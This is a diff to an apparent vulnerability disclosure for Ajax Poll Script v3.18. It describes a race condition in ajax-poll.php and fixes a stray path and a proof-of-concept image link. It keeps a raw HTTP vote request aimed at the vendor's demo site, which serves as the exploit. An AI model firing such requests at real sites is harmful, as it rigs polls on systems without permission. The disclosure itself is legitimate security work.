@@ -2,7 +2,6 @@ Ajax Poll Script V3.18
 
 #### Race Condition in  ajax-poll.php
 
-POST /ci_exam/kelasdosen/data*
 ```
 POST /mod/APSMX/v3.18/demo/ajax-poll.php HTTP/1.1
 Host: www.phpkobo.com
@@ -25,5 +24,5 @@ Te: trailers
 cmd=vote&answer=%5B%22Vancouver%22%5D&appid=WbOqpMWLRsLA0b6VTOkmvyj04xZO8LZaFKPVx8S6tNeVbJYfcZVHWBpRZkwqrch6&tclass=poll-background-image&tid=```
 PoC Image:
 
-![PoC Image](img/kelasdosen.png "POC IMAGE")
+![PoC Image](PHPKOBO/apsmx_ajax_pool_3.18.PNG "POC IMAGE")
 
